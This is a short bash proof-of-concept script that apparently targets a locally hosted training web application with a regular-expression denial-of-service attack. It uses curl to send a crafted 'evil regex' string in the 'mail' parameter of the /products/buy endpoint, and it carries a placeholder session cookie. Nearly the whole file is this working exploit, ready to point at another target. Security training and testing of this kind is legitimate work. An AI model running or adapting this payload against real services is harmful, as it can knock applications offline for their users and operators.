#!/usr/bin/env bash

#
# Evil regex: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
# Insert point: /products/buy
# Vulnerable parameter: mail
#

# Put here your cookie session value, like:
#COOKIE="Cookie: connect.sid=s%3AM9Ddp0pSbLOrBbgz9V6v2UhZMs1zTbTy.kS5d8QwFWge7FRH7KbveH2QLf6rAYvBft75nU6jgLzQ"
COOKIE=""
EVIL_REGEX="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
TARGET="http://127.0.0.1:3000"

curl "$TARGET/products/buy?mail=$EVIL_REGEX&address=asdfasdf&ship_date=10/10/2016&phone=1111111&product_id=2&product_name=product%20name&username=admin&price=1" -H "$COOKIE"